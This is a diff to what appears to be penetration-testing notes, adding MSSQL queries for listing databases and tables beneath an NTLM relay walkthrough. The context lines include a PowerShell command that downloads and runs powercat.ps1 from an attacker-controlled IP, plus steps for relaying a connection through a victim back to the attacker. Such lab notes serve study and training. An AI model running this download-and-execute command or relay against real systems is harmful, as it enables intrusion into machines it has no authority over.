@@ -122,3 +122,13 @@ Next, we will invoke powercat.ps1: `iex(iwr http://192.168.45.223/powercat.ps1 -
 Once it's running we can check if the victim is listening on port 445: `netstat -anto | findstr 445`
 
 Last step is to perform the Relay - !REMEMEBER! not to our attacking box, but to the victim machine! and see the callback to our machine on port 445 tunneled from the victim!
+
+# MSSQL Useful Queries
+
+List databases:
+- `select * from sys.databases;`
+
+List tables inside specific databases:
+- `select * from <DATABASE NAME>..sysobjects WHERE xtype = 'U';`
+
+
